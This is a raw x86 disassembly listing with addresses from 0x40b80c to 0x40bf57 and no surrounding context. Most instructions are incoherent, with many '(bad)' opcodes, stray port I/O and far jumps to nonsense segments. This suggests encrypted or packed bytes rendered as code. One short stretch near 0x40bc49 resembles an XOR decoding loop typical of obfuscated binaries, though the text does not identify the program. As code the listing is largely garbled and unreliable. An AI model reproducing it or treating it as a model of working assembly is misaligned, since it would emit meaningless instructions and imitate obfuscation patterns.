  40b80c:	mov    ds:0x3e6828fb,eax
  40b811:	repnz sbb eax,0x67e32b2
  40b817:	and    eax,0xc892a77c
  40b81c:	add    ch,dh
  40b81e:	(bad)  
  40b81f:	cmp    eax,0x17ee5893
  40b824:	outs   dx,BYTE PTR ds:[esi]
  40b825:	mov    ds:0x37d78372,al
  40b82a:	jnp    0x40b882
  40b82c:	mov    esp,0xa6bac104
  40b831:	mov    esi,0xa3401d38
  40b836:	pushf  
  40b837:	jmp    0x40b7fa
  40b839:	cmp    DWORD PTR [edx+0x3a56fcc8],edi
  40b83f:	js     0x40b7c2
  40b841:	test   eax,ecx
  40b843:	push   eax
  40b844:	mov    esi,0xf5b2548e
  40b849:	js     0x40b7dc
  40b84b:	mov    ds:0xdc346e67,al
  40b850:	(bad)  
  40b851:	inc    ebx
  40b852:	pop    es
  40b853:	mov    BYTE PTR [ecx-0x2d3318a2],ah
  40b859:	ins    BYTE PTR es:[edi],dx
  40b85a:	repnz mov dh,0x86
  40b85d:	or     eax,DWORD PTR [ebx]
  40b85f:	mov    ebx,0x110dcbdd
  40b864:	shl    BYTE PTR [ecx-0x6dcab0c6],1
  40b86a:	jmp    0xda15:0xf77f97db
  40b871:	out    0xb9,eax
  40b873:	jns    0x40b8bb
  40b875:	xor    dl,BYTE PTR [bp+di-0x5]
  40b879:	dec    ecx
  40b87a:	jnp    0x40b892
  40b87c:	push   ebx
  40b87d:	ud1    ebp,DWORD PTR [ebx+0xe]
  40b881:	test   BYTE PTR [ebx],dh
  40b883:	(bad)  
  40b884:	sahf   
  40b885:	push   esi
  40b886:	sahf   
  40b887:	cmc    
  40b888:	mov    BYTE PTR [ebx-0x1fbcbe27],dh
  40b88e:	aaa    
  40b88f:	(bad)  
  40b890:	ja     0x40b826
  40b892:	or     DWORD PTR [edi+0x6b],0x3e
  40b896:	pop    edx
  40b897:	mov    ds:0xf3accb6a,eax
  40b89c:	add    eax,0x17263b20
  40b8a1:	inc    ebx
  40b8a2:	(bad)  [ecx-0x67]
  40b8a5:	shr    BYTE PTR [ebp+ecx*2+0x45],1
  40b8a9:	arpl   WORD PTR [eax],bp
  40b8ab:	xor    ebp,DWORD PTR [edx+ebx*8+0x78]
  40b8af:	mov    bh,cl
  40b8b1:	sub    bh,bl
  40b8b3:	mov    bh,0xe8
  40b8b5:	mov    ebp,0xc9f50510
  40b8ba:	in     eax,0x73
  40b8bc:	loop   0x40b8c7
  40b8be:	arpl   WORD PTR [ebp+0x37348e95],ax
  40b8c4:	sbb    BYTE PTR [edx],ch
  40b8c6:	cmp    esi,DWORD PTR [edi-0x1007a427]
  40b8cc:	jo     0x40b855
  40b8ce:	and    BYTE PTR [eax-0x795d8a48],bl
  40b8d4:	mov    eax,es:0xdd8a1da7
  40b8da:	(bad)  
  40b8db:	(bad)  
  40b8dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8dd:	inc    esi
  40b8de:	sbb    cl,BYTE PTR [ebx-0x11eb7569]
  40b8e4:	out    dx,al
  40b8e5:	inc    ebp
  40b8e6:	mov    cl,0x45
  40b8e8:	xchg   DWORD PTR [esi],edx
  40b8ea:	dec    edi
  40b8eb:	call   0xff0c:0x20dad473
  40b8f2:	fwait
  40b8f3:	sub    ebp,edx
  40b8f5:	aad    0xb6
  40b8f7:	add    ebx,edi
  40b8f9:	out    dx,al
  40b8fa:	iret   
  40b8fb:	sub    al,0xcc
  40b8fd:	imul   esi,edi,0x63
  40b900:	sti    
  40b901:	pop    esp
  40b902:	(bad)  
  40b903:	dec    esi
  40b904:	add    edi,ecx
  40b906:	pop    eax
  40b907:	jle    0x40b8d3
  40b909:	push   esp
  40b90a:	adc    bh,BYTE PTR [eax]
  40b90c:	pop    ds
  40b90d:	aad    0xc3
  40b90f:	sub    al,0x1c
  40b911:	retf   
  40b912:	outs   dx,BYTE PTR ds:[esi]
  40b913:	mov    esp,0x31a8c63d
  40b918:	jnp    0x40b929
  40b91a:	test   BYTE PTR [edi],ah
  40b91c:	add    eax,DWORD PTR [eax]
  40b91e:	add    BYTE PTR [ebx+0x2081f045],cl
  40b924:	sbb    BYTE PTR [esi*2-0x3451700],0xff
  40b92c:	(bad)  
  40b92d:	jmp    0x40bc46
  40b932:	into   
  40b933:	aas    
  40b934:	ds ror ebp,0xc1
  40b938:	rcl    ebx,1
  40b93a:	add    esi,DWORD PTR [edi]
  40b93c:	stos   DWORD PTR es:[edi],eax
  40b93d:	ror    DWORD PTR [edi-0x39c955e8],cl
  40b943:	mov    WORD PTR [eax+0x78],?
  40b946:	je     0x40b9c6
  40b948:	js     0x40b9c2
  40b94a:	out    0xc2,al
  40b94c:	jae    0x40b9c2
  40b94e:	inc    edi
  40b94f:	push   ecx
  40b950:	mov    esp,0xbbf5cedc
  40b955:	mov    ds:0x99aef616,al
  40b95a:	test   DWORD PTR [edx],0xe0f5c658
  40b960:	xor    ch,BYTE PTR [edi]
  40b962:	push   ebp
  40b963:	xchg   ah,al
  40b965:	mov    ah,0x10
  40b967:	pop    edx
  40b968:	jbe    0x40b9b6
  40b96a:	(bad)  
  40b96c:	or     ch,ch
  40b96e:	mov    ds:0x160a8a3c,al
  40b973:	daa    
  40b974:	stc    
  40b975:	jo     0x40b96a
  40b977:	sbb    DWORD PTR [ecx],eax
  40b979:	repz xor al,0xea
  40b97c:	add    eax,0xaee8d817
  40b981:	inc    eax
  40b983:	lock and DWORD PTR [esp+edi*1+0x9],0x1d78a366
  40b98c:	dec    esp
  40b98d:	aaa    
  40b98e:	test   al,al
  40b990:	dec    BYTE PTR [eax+0x4b]
  40b993:	push   eax
  40b994:	adc    eax,0xd5efe659
  40b999:	cmp    eax,0xbc87b07e
  40b99e:	xchg   esp,eax
  40b99f:	addr16 push esp
  40b9a1:	or     bl,dl
  40b9a3:	fiadd  WORD PTR [esi-0x50]
  40b9a6:	fistp  QWORD PTR [eax+0x73]
  40b9a9:	dec    eax
  40b9aa:	push   0x14
  40b9ac:	mov    gs,WORD PTR [ebx]
  40b9ae:	ins    BYTE PTR es:[edi],dx
  40b9af:	mov    BYTE PTR [ebx+eiz*2-0x58],ch
  40b9b3:	mov    ebx,edx
  40b9b5:	push   ss
  40b9b6:	lods   al,BYTE PTR ds:[esi]
  40b9b7:	stos   DWORD PTR es:[edi],eax
  40b9b8:	(bad)  
  40b9b9:	sbb    eax,0x33ae2d1e
  40b9be:	imul   ebp,DWORD PTR [edi+eax*8],0xfffffffe
  40b9c2:	and    bl,dl
  40b9c4:	clc    
  40b9c5:	test   DWORD PTR [edi],ecx
  40b9c7:	fidivr DWORD PTR ds:0xc1d6c66a
  40b9cd:	inc    edi
  40b9ce:	jl     0x40b98e
  40b9d0:	rol    BYTE PTR [ebx-0x20],1
  40b9d3:	xchg   ebx,eax
  40b9d4:	jmp    0x9bae27a6
  40b9d9:	mov    ds:0xba3ad949,eax
  40b9de:	inc    edx
  40b9df:	cmp    dl,BYTE PTR [ebx+0x3d6392e3]
  40b9e5:	clc    
  40b9e6:	mov    ds:0x8e7670e,eax
  40b9eb:	shr    edi,0xd7
  40b9ee:	loopne 0x40b9a3
  40b9f0:	imul   eax,DWORD PTR [edx-0x30],0x6f
  40b9f4:	pop    ebp
  40b9f5:	add    DWORD PTR [edi+0x12b723f2],0x39
  40b9fc:	sbb    DWORD PTR [edx-0x6ba45998],esi
  40ba02:	popf   
  40ba03:	leave  
  40ba04:	jle    0x40ba40
  40ba06:	outs   dx,DWORD PTR ds:[esi]
  40ba07:	push   ss
  40ba08:	cmp    BYTE PTR [edx-0x6d9eef9a],bh
  40ba0e:	sub    al,0xd8
  40ba10:	out    dx,eax
  40ba11:	into   
  40ba12:	dec    esp
  40ba13:	aas    
  40ba14:	xchg   ebp,eax
  40ba15:	mov    dl,0x8
  40ba17:	sbb    BYTE PTR [edi],dl
  40ba19:	jp     0x40ba81
  40ba1b:	pop    edi
  40ba1c:	cld    
  40ba1d:	iret   
  40ba1e:	cli    
  40ba1f:	adc    ah,dl
  40ba21:	xlat   BYTE PTR ds:[ebx]
  40ba22:	add    BYTE PTR [edx],al
  40ba24:	aas    
  40ba25:	addr16 jno 0x40ba8c
  40ba28:	daa    
  40ba29:	stos   BYTE PTR es:[edi],al
  40ba2a:	mov    es,WORD PTR [ecx]
  40ba2c:	leave  
  40ba2d:	das    
  40ba2e:	cmp    esi,edx
  40ba30:	mov    esp,0x948f8b2b
  40ba35:	lock in al,0xcb
  40ba38:	int    0x2a
  40ba3a:	pop    ebp
  40ba3b:	int3   
  40ba3c:	shl    edx,cl
  40ba3e:	sub    dl,bh
  40ba40:	out    0xa1,eax
  40ba42:	sbb    ch,0x7f
  40ba45:	cli    
  40ba46:	jp     0x40baa7
  40ba48:	retf   
  40ba49:	rcr    DWORD PTR [edi+0x5c84a686],1
  40ba4f:	push   edx
  40ba50:	jne    0x40ba2a
  40ba52:	push   ss
  40ba53:	in     al,dx
  40ba54:	mov    bh,0x6c
  40ba56:	fwait
  40ba57:	in     eax,0xb
  40ba59:	add    BYTE PTR [ebx],cl
  40ba5b:	inc    esi
  40ba5c:	sbb    ah,BYTE PTR [ebx-0x8]
  40ba5f:	iret   
  40ba60:	outs   dx,DWORD PTR ds:[esi]
  40ba61:	in     al,dx
  40ba62:	add    al,0xb6
  40ba64:	mov    esp,0x31388077
  40ba69:	or     ebp,esi
  40ba6b:	xchg   esi,eax
  40ba6c:	jp     0x40bae9
  40ba6e:	mov    dh,0xe5
  40ba70:	out    0xe1,eax
  40ba72:	jp     0x40baec
  40ba74:	add    eax,0xd20ded83
  40ba79:	jge    0x40ba0e
  40ba7b:	fnstenv [ecx+0x391993cd]
  40ba81:	add    BYTE PTR [ecx-0x90a5fbb],0xd0
  40ba88:	jl     0x40bae6
  40ba8a:	adc    eax,0xed2715b5
  40ba8f:	add    ecx,ebp
  40ba91:	retf   0x622e
  40ba94:	ds popa 
  40ba96:	popf   
  40ba97:	iret   
  40ba98:	mov    al,0x28
  40ba9a:	xchg   ebp,eax
  40ba9b:	(bad)
  40baa0:	cmp    DWORD PTR [eax-0x4d],ebp
  40baa3:	(bad)  
  40baa4:	mov    eax,0x51e7637b
  40baa9:	ins    BYTE PTR es:[edi],dx
  40baaa:	mov    eax,ds:0xea9d059f
  40baaf:	inc    ebp
  40bab0:	test   DWORD PTR [ebp-0x3b],edi
  40bab3:	dec    esp
  40bab4:	idiv   DWORD PTR [ecx-0x1821ea6f]
  40baba:	push   edx
  40babb:	lods   al,BYTE PTR ds:[esi]
  40babc:	fs out 0xbb,eax
  40babf:	pop    ebx
  40bac0:	xlat   BYTE PTR ds:[ebx]
  40bac1:	xchg   edx,eax
  40bac2:	ss jmp 0xb0c7:0xf4b9422d
  40baca:	xor    al,0xb8
  40bacc:	retf   
  40bacd:	dec    esp
  40bace:	inc    ebp
  40bacf:	dec    ebp
  40bad0:	ret    0x42e2
  40bad3:	daa    
  40bad4:	inc    ecx
  40bad5:	mov    ebx,DWORD PTR [ebp+0x71d883d3]
  40badb:	sub    dh,BYTE PTR [esi-0x14]
  40bade:	or     al,cl
  40bae0:	or     al,0xaf
  40bae2:	lock fistp WORD PTR [ebx]
  40bae5:	es enter 0xd47c,0x2b
  40baea:	aam    0x34
  40baec:	cmp    BYTE PTR [edx+0xa],al
  40baef:	mov    ebp,edi
  40baf1:	(bad)  
  40baf2:	ds daa 
  40baf4:	leave  
  40baf5:	test   BYTE PTR [eax],al
  40baf7:	js     0x40bb42
  40baf9:	retf   
  40bafa:	inc    edi
  40bafb:	ret    
  40bafc:	fcmovnu st,st(6)
  40bafe:	dec    ebp
  40baff:	jmp    0x91ed:0xbad27ec7
  40bb06:	push   eax
  40bb07:	xor    eax,DWORD PTR [esi]
  40bb09:	aad    0x83
  40bb0b:	xchg   ebp,eax
  40bb0c:	push   ebp
  40bb0d:	inc    edi
  40bb0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb0f:	push   esp
  40bb10:	nop
  40bb11:	out    dx,al
  40bb12:	repnz push edx
  40bb14:	mov    dl,0x75
  40bb16:	pop    ebp
  40bb17:	jnp    0x40bb26
  40bb19:	(bad)
  40bb1d:	or     edi,DWORD PTR [ecx+0x3435bf69]
  40bb23:	(bad)  
  40bb24:	cdq    
  40bb25:	enter  0x89b7,0x3b
  40bb29:	mov    bl,0xd4
  40bb2b:	xchg   DWORD PTR [ebx+0x2],edx
  40bb2e:	(bad)  
  40bb30:	push   edx
  40bb31:	add    ecx,DWORD PTR [edx]
  40bb33:	clc    
  40bb34:	mov    esp,DWORD PTR [ebp-0x1ebefbd4]
  40bb3a:	xchg   esi,eax
  40bb3b:	sub    al,0xe9
  40bb3d:	push   0x1e9a93af
  40bb42:	out    dx,al
  40bb43:	dec    edi
  40bb44:	(bad)  
  40bb45:	pop    ss
  40bb46:	enter  0x7431,0xa2
  40bb4a:	pop    ss
  40bb4b:	jmp    0x40bb3d
  40bb4d:	retf   0xf1ca
  40bb50:	fstp   DWORD PTR [edx-0x6faa02d3]
  40bb56:	retf   0x2d8b
  40bb59:	push   es
  40bb5a:	pop    ebx
  40bb5b:	jno    0x40bbb0
  40bb5d:	jae    0x40bb7a
  40bb5f:	aaa    
  40bb60:	and    eax,0x37b2b9eb
  40bb65:	es gs call 0x8757:0x4f0cbeb5
  40bb6e:	or     DWORD PTR [edx-0x44],ebx
  40bb71:	mov    ebx,0x4c3242e9
  40bb76:	(bad)  
  40bb77:	or     al,0x87
  40bb79:	ror    BYTE PTR [eax+0x2],1
  40bb7c:	mov    bh,0x88
  40bb7e:	fmul   DWORD PTR [eax+esi*2+0x2e]
  40bb82:	les    ecx,FWORD PTR [ecx-0x3d]
  40bb85:	cdq    
  40bb86:	mov    al,0x7d
  40bb88:	int3   
  40bb89:	add    eax,0xea794a78
  40bb8e:	xlat   BYTE PTR ds:[ebx]
  40bb8f:	xchg   esp,eax
  40bb90:	imul   edi,DWORD PTR [eax],0x5298e850
  40bb96:	icebp  
  40bb97:	les    esp,FWORD PTR [ebp-0x346da7bb]
  40bb9d:	outs   dx,DWORD PTR ds:[esi]
  40bb9e:	ret    
  40bb9f:	xchg   edi,esi
  40bba1:	inc    eax
  40bba2:	in     eax,dx
  40bba3:	jp     0x40bbcf
  40bba5:	cmp    DWORD PTR [eax+0x32],eax
  40bba8:	push   ebp
  40bba9:	loopne 0x40bbd5
  40bbab:	dec    eax
  40bbac:	push   ds
  40bbad:	jae    0x40bb97
  40bbaf:	(bad)  
  40bbb1:	mov    esi,0x259b3c95
  40bbb6:	inc    edx
  40bbb7:	inc    esp
  40bbb8:	push   0x3cf14735
  40bbbd:	sub    ch,bh
  40bbbf:	mov    esp,0x1645f72a
  40bbc4:	in     eax,dx
  40bbc5:	pop    es
  40bbc6:	repz es repnz dec ecx
  40bbca:	pop    ecx
  40bbcb:	lea    ecx,[edx-0x1ef452af]
  40bbd1:	inc    esp
  40bbd2:	mov    cl,0x73
  40bbd4:	std    
  40bbd5:	xor    DWORD PTR [edx+0x12],ebp
  40bbd8:	mov    cl,0xbb
  40bbda:	jno    0x40bc53
  40bbdc:	hlt    
  40bbdd:	xor    al,0x47
  40bbdf:	inc    edx
  40bbe0:	jge    0x40bc42
  40bbe2:	clc    
  40bbe3:	outs   dx,BYTE PTR ds:[esi]
  40bbe4:	scas   eax,DWORD PTR es:[edi]
  40bbe5:	in     eax,0xe2
  40bbe7:	mov    ebx,0x5b57b37a
  40bbec:	sbb    edi,DWORD PTR [edx-0x3c]
  40bbef:	(bad)
  40bbf2:	xchg   BYTE PTR [edi+0x65],bh
  40bbf5:	jl     0x40bc61
  40bbf7:	pop    esi
  40bbf8:	adc    esp,esp
  40bbfa:	hlt    
  40bbfb:	push   edx
  40bbfc:	inc    ebp
  40bbfd:	push   es
  40bbfe:	imul   edi,ecx,0xfa6a11b5
  40bc04:	out    0x75,eax
  40bc06:	scas   al,BYTE PTR es:[edi]
  40bc07:	cmp    eax,0x994ea574
  40bc0c:	and    eax,DWORD PTR [ecx+0x1596d248]
  40bc12:	push   0xffffff98
  40bc14:	jle    0x40bc0c
  40bc16:	test   DWORD PTR [esi],ebx
  40bc18:	mov    bl,0x56
  40bc1a:	test   DWORD PTR [bx-0xa21],eax
  40bc1f:	pushf  
  40bc20:	or     al,0xd
  40bc22:	sbb    DWORD PTR [eax],0x49
  40bc25:	jecxz  0x40bc53
  40bc27:	add    DWORD PTR [eax],ebp
  40bc29:	mov    bl,0x6a
  40bc2b:	fisttp QWORD PTR [ebp-0x78]
  40bc2e:	ror    ch,0x15
  40bc31:	mov    eax,0x68628339
  40bc36:	jne    0x40bbe4
  40bc38:	aam    0x4d
  40bc3a:	mov    edi,0x6c8bc5f9
  40bc3f:	inc    ebp
  40bc40:	push   esi
  40bc41:	inc    ecx
  40bc42:	jmp    0x8c2cec89
  40bc47:	inc    ebp
  40bc48:	hlt    
  40bc49:	mov    edx,DWORD PTR [ebp-0x18]
  40bc4c:	or     eax,edx
  40bc4e:	cmp    eax,0xfa9f7e76
  40bc53:	je     0x40bc67
  40bc59:	mov    eax,DWORD PTR [ebp-0x10]
  40bc5c:	xor    DWORD PTR [eax],0x2650fa8e
  40bc62:	jmp    0x40b5e7
  40bc67:	mov    ax,WORD PTR [ebp-0x4]
  40bc6b:	jmp    0x40bf84
  40bc70:	(bad)  
  40bc71:	ds ret 
  40bc73:	ror    bl,cl
  40bc75:	rcl    ebp,1
  40bc77:	fisubr DWORD PTR [ebp+0x56]
  40bc7a:	xchg   esp,eax
  40bc7b:	jge    0x40bc7b
  40bc7d:	jno    0x40bc9d
  40bc7f:	fs ret 0x7891
  40bc83:	js     0x40bcf9
  40bc85:	jle    0x40bcff
  40bc87:	js     0x40bc42
  40bc89:	(bad)  
  40bc8a:	cli    
  40bc8b:	mov    cs,WORD PTR [ebx+edi*2]
  40bc8e:	xor    DWORD PTR [edx],esi
  40bc90:	hlt    
  40bc91:	pop    es
  40bc92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc93:	pop    eax
  40bc94:	and    al,0xc8
  40bc96:	dec    ebp
  40bc97:	and    ch,bh
  40bc99:	dec    ecx
  40bc9a:	push   cs
  40bc9b:	stos   DWORD PTR es:[edi],eax
  40bc9c:	sbb    edx,DWORD PTR [eax-0x12c349b8]
  40bca2:	imul   DWORD PTR [edi+0x4b]
  40bca5:	lock xchg ebp,esp
  40bca8:	pop    ss
  40bca9:	cmp    eax,DWORD PTR [edi]
  40bcab:	int3   
  40bcac:	dec    esi
  40bcad:	dec    ecx
  40bcae:	mov    esi,DWORD PTR [edi]
  40bcb0:	ficomp WORD PTR [esi+0x25]
  40bcb3:	call   0xad7e8973
  40bcb8:	mov    DWORD PTR [ebx+0x1c97a10f],ebx
  40bcbe:	xor    eax,0x9a43510c
  40bcc3:	jb     0x40bcd0
  40bcc5:	adc    ebp,ebp
  40bcc7:	dec    ecx
  40bcc8:	add    al,dh
  40bcca:	sub    BYTE PTR [eax+0x5d711af0],bl
  40bcd0:	push   edi
  40bcd1:	ffree  st(6)
  40bcd3:	cmp    edx,ebp
  40bcd5:	imul   edi,edx,0xfffffff6
  40bcd8:	call   0x10b5:0xb3eef80b
  40bcdf:	in     al,0xd1
  40bce1:	movntps XMMWORD PTR [ecx+0x7592e748],xmm0
  40bce8:	je     0x40bcfb
  40bcea:	jmp    0x40bc6c
  40bcec:	push   eax
  40bced:	popf   
  40bcee:	leave  
  40bcef:	test   eax,0x5bd01deb
  40bcf4:	(bad)  
  40bcf5:	jecxz  0x40bd66
  40bcf7:	ffree  st(1)
  40bcf9:	repnz cli 
  40bcfb:	mov    al,ds:0xc5b5e6bd
  40bd00:	shl    BYTE PTR [edx+0x1f],0xfb
  40bd04:	mov    esp,0xd697cbe3
  40bd09:	push   ecx
  40bd0a:	(bad)  
  40bd0b:	xchg   edi,eax
  40bd0c:	mov    ebp,0xe5eb6daa
  40bd11:	iret   
  40bd12:	stos   DWORD PTR es:[edi],eax
  40bd13:	push   0xffffffb1
  40bd15:	sub    ebp,0x8
  40bd18:	out    0xdd,al
  40bd1a:	xor    al,0x46
  40bd1c:	inc    edx
  40bd1d:	scas   eax,DWORD PTR es:[edi]
  40bd1e:	xchg   bl,bl
  40bd20:	imul   ebp,eax,0xffffff87
  40bd23:	push   es
  40bd24:	imul   esi,ebx,0xffffffe7
  40bd27:	mov    bl,0xf8
  40bd29:	and    al,0x78
  40bd2b:	cld    
  40bd2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd2d:	fld    st(7)
  40bd2f:	(bad)  
  40bd30:	cmp    BYTE PTR [ecx-0x4e],dl
  40bd33:	adc    eax,0x14105723
  40bd38:	lods   al,BYTE PTR es:[esi]
  40bd3a:	sahf   
  40bd3b:	stos   BYTE PTR es:[edi],al
  40bd3c:	mov    ecx,0x42524502
  40bd41:	nop
  40bd42:	xchg   edx,eax
  40bd43:	pop    esp
  40bd44:	push   edx
  40bd45:	mov    fs,WORD PTR [ecx+0x60bb8e46]
  40bd4b:	pop    esi
  40bd4c:	nop
  40bd4d:	xchg   BYTE PTR [ebx],dh
  40bd4f:	inc    eax
  40bd50:	inc    ebp
  40bd51:	out    0x49,eax
  40bd53:	add    DWORD PTR [esi+ecx*1-0x1a5e151a],edx
  40bd5a:	std    
  40bd5b:	push   0x710b501b
  40bd60:	and    BYTE PTR [ebp+0x16],dh
  40bd63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd64:	xchg   esp,eax
  40bd65:	mov    ebx,0x409fea7
  40bd6a:	or     bh,BYTE PTR [edx+0x3442ea52]
  40bd70:	jb     0x40bd13
  40bd72:	cld    
  40bd73:	sub    dh,BYTE PTR [edi+ecx*2-0x16]
  40bd77:	retf   
  40bd78:	pop    edx
  40bd79:	push   es
  40bd7a:	jbe    0x40bd01
  40bd7c:	in     eax,dx
  40bd7d:	stc    
  40bd7e:	popf   
  40bd7f:	repnz icebp 
  40bd81:	jmp    0xe52b:0x94db119a
  40bd88:	adc    DWORD PTR [edi-0x4],ebx
  40bd8b:	(bad)  
  40bd8c:	sbb    esi,DWORD PTR [eax]
  40bd8e:	jle    0x40bdb1
  40bd90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd91:	data16 je 0x40bd5b
  40bd94:	sti    
  40bd95:	dec    edi
  40bd96:	adc    esi,esi
  40bd98:	std    
  40bd99:	mov    DWORD PTR [edx-0x64],eax
  40bd9c:	lods   al,BYTE PTR ds:[esi]
  40bd9d:	sbb    eax,0x8241bb38
  40bda2:	pop    esp
  40bda3:	mov    ebx,0xad7a2bb
  40bda8:	mov    eax,ds:0xcd95c2be
  40bdad:	and    ebp,DWORD PTR [edx+0x61]
  40bdb0:	jbe    0x40bdae
  40bdb2:	adc    esi,DWORD PTR [edx]
  40bdb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdb5:	xor    DWORD PTR [esi],ebx
  40bdb7:	and    BYTE PTR [edi+0xed0f5ff],dh
  40bdbd:	addr16 inc ebx
  40bdbf:	inc    ebp
  40bdc0:	or     ebp,DWORD PTR [ebx]
  40bdc2:	jbe    0x40bd75
  40bdc4:	add    edx,DWORD PTR [ebx+0x30]
  40bdc7:	(bad)  
  40bdc8:	xchg   edx,eax
  40bdc9:	daa    
  40bdca:	shr    BYTE PTR [esi+0x3f],0x1
  40bdce:	adc    ah,ch
  40bdd0:	fcom   st(0)
  40bdd2:	push   ebx
  40bdd3:	pop    esp
  40bdd4:	xor    bh,BYTE PTR [ecx-0x71]
  40bdd7:	scas   al,BYTE PTR es:[edi]
  40bdd8:	inc    ebp
  40bdd9:	sub    ch,BYTE PTR [esi-0x7a]
  40bddc:	int3   
  40bddd:	aaa    
  40bdde:	inc    eax
  40bddf:	sbb    eax,0x89f2e57f
  40bde4:	xacquire xchg BYTE PTR [edx+0x4e],cl
  40bde8:	in     eax,0xcd
  40bdea:	int3   
  40bdeb:	call   0x80efd3b
  40bdf0:	dec    ecx
  40bdf1:	in     al,0xc5
  40bdf3:	imul   edx,DWORD PTR [ebx],0x6d
  40bdf6:	in     eax,dx
  40bdf7:	cs jnp 0x40be0b
  40bdfa:	sahf   
  40bdfb:	push   eax
  40bdfc:	rcl    DWORD PTR [ecx],cl
  40bdfe:	test   al,0x88
  40be00:	fisub  WORD PTR [ebp+0x5b]
  40be03:	sahf   
  40be04:	ins    DWORD PTR es:[edi],dx
  40be05:	jno    0x40bdf6
  40be07:	(bad)  
  40be08:	dec    ebp
  40be09:	mov    cl,0x5c
  40be0b:	cmp    ah,al
  40be0d:	loope  0x40bda2
  40be0f:	shl    WORD PTR [ebx-0x10cc6b85],cl
  40be16:	and    BYTE PTR [esp+eax*8],cl
  40be19:	mov    ds:0x1640a909,al
  40be1e:	push   ebp
  40be1f:	sub    al,0x12
  40be21:	loop   0x40be29
  40be23:	push   ebx
  40be24:	fistp  DWORD PTR [ebp+0x34]
  40be27:	(bad)  
  40be28:	and    bl,BYTE PTR [ebp-0x4d9482e9]
  40be2e:	inc    edx
  40be2f:	mov    BYTE PTR [ecx+0x4],bl
  40be32:	xchg   edi,eax
  40be33:	push   ss
  40be34:	adc    eax,0x49637ad7
  40be39:	push   ss
  40be3a:	xchg   edx,eax
  40be3b:	pop    esi
  40be3c:	jo     0x40be6b
  40be3e:	lods   eax,DWORD PTR ds:[esi]
  40be3f:	add    DWORD PTR ds:0x7873a23d,eax
  40be45:	fs jb  0x40be15
  40be48:	sbb    eax,0x4d5e799f
  40be4d:	sar    DWORD PTR [ecx-0x3b6e0d4e],1
  40be53:	adc    eax,0x41654e51
  40be58:	dec    ebx
  40be59:	les    eax,FWORD PTR [edi+ebp*1-0x25282b86]
  40be60:	mov    ah,0x1b
  40be62:	xchg   ebx,eax
  40be63:	push   cs
  40be64:	into   
  40be65:	cmp    BYTE PTR [eax],al
  40be67:	inc    ebp
  40be68:	xchg   esi,eax
  40be69:	or     DWORD PTR [esi+ebx*4],edx
  40be6c:	cwde   
  40be6d:	stos   BYTE PTR es:[edi],al
  40be6e:	cs inc esi
  40be70:	push   ecx
  40be71:	pop    ecx
  40be72:	jecxz  0x40be55
  40be74:	sub    BYTE PTR ss:[edi-0x581252d1],dl
  40be7b:	mov    edx,ecx
  40be7d:	daa    
  40be7e:	loop   0x40be17
  40be80:	int3   
  40be81:	mov    eax,0xd0759f2
  40be86:	add    eax,0xef3cc325
  40be8b:	fstp   TBYTE PTR [edi]
  40be8d:	es retf 
  40be8f:	(bad)  
  40be90:	xchg   esp,eax
  40be91:	jmp    0xbf0c1c28
  40be96:	pop    esi
  40be97:	cmp    DWORD PTR [esi-0x32],eax
  40be9a:	cmp    edi,DWORD PTR [edx+0x1a867704]
  40bea0:	push   edx
  40bea1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bea2:	push   esi
  40bea3:	mov    ebp,0xe9bc4f5c
  40bea8:	xchg   DWORD PTR [ebp-0x57d89580],ebx
  40beae:	ins    DWORD PTR es:[edi],dx
  40beaf:	xor    ebp,DWORD PTR [ebx+0x35]
  40beb2:	sbb    al,dh
  40beb4:	sbb    edi,DWORD PTR [ebp-0x2cd071ef]
  40beba:	push   0xbf45231f
  40bebf:	mov    ebx,0x65d67fff
  40bec4:	xchg   ecx,eax
  40bec5:	or     eax,0x149e633c
  40beca:	mov    ah,0x7e
  40becc:	sub    BYTE PTR [ebp+0x3d],ah
  40becf:	or     edi,DWORD PTR [eax-0x32]
  40bed2:	cli    
  40bed3:	(bad)  
  40bed4:	loope  0x40bf2d
  40bed6:	mov    ebp,0x61b1a0cf
  40bedb:	fsubr  st,st(6)
  40bedd:	lods   eax,DWORD PTR ds:[esi]
  40bede:	jmp    0xda8e:0xac35558b
  40bee5:	in     eax,0x82
  40bee7:	test   eax,0xea7d1cf3
  40beec:	jae    0x40befd
  40beee:	clc    
  40beef:	aas    
  40bef0:	pop    ebp
  40bef1:	ror    bl,cl
  40bef3:	iret   
  40bef4:	mov    edi,edx
  40bef6:	pusha  
  40bef7:	adc    bh,BYTE PTR [edi]
  40bef9:	pop    eax
  40befa:	pop    ebp
  40befb:	cmp    dl,BYTE PTR [ebp+0x6b270aaa]
  40bf01:	cld    
  40bf02:	jne    0x40beed
  40bf04:	rcl    BYTE PTR [ecx+0x24b92b17],0x45
  40bf0b:	sti    
  40bf0c:	or     ebp,esp
  40bf0e:	std    
  40bf0f:	vminps ymm2,ymm4,ymm4
  40bf13:	cmp    dl,dl
  40bf15:	cmp    DWORD PTR [edi],esp
  40bf17:	pop    ebx
  40bf18:	shl    BYTE PTR [ebp-0x6e10818b],0x33
  40bf1f:	or     DWORD PTR [ebx],edx
  40bf21:	xchg   ebp,eax
  40bf22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf23:	jo     0x40bf59
  40bf25:	xchg   esi,eax
  40bf26:	je     0x40bf67
  40bf28:	push   edi
  40bf29:	sbb    ah,ch
  40bf2b:	adc    al,dh
  40bf2d:	add    eax,0xa5404d71
  40bf32:	imul   eax,DWORD PTR [ebp+0x12],0x16cdc700
  40bf39:	jo     0x40bf57
  40bf3b:	add    ah,BYTE PTR [edi]
  40bf3d:	(bad)  
  40bf3e:	shl    BYTE PTR [ebx+0xd],0xf6
  40bf42:	sbb    ebp,ecx
  40bf44:	stc    
  40bf45:	shr    DWORD PTR [ecx+0x79],1
  40bf48:	aam    0x0
  40bf4a:	push   ds
  40bf4b:	sbb    DWORD PTR [ebp+0x7],esp
  40bf4e:	pop    eax
  40bf4f:	ja     0x40bf88
  40bf51:	enter  0x748a,0x26
  40bf55:	cmp    al,BYTE PTR [ecx]
  40bf57:	xor    BYTE PTR [ebx+0x1b],dl
